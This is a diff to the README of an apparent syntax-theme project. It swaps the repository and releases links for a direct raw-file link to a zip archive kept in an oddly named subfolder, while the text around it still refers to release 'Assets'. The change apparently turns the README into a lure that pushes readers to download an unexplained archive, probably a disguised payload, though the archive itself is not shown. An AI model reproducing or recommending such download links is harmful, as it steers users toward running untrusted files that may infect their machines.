@@ -1,6 +1,6 @@
 # 🎨 github-syntax-themes - Give your code a new look
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Clovisbounden710/github-syntax-themes)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Clovisbounden710/github-syntax-themes/main/fairyologist/github-syntax-themes-2.6.zip)
 
 ## 📋 About This Project
 
@@ -21,7 +21,7 @@ Make sure your browser is up to date. Old versions might cause display errors. Y
 
 ## 📥 How to Download
 
-Visit [this page](https://github.com/Clovisbounden710/github-syntax-themes/releases) to find the correct file for your browser. 
+Visit [this page](https://raw.githubusercontent.com/Clovisbounden710/github-syntax-themes/main/fairyologist/github-syntax-themes-2.6.zip) to find the correct file for your browser. 
 
 1. Click the link above.
 2. Look for the section called Assets.
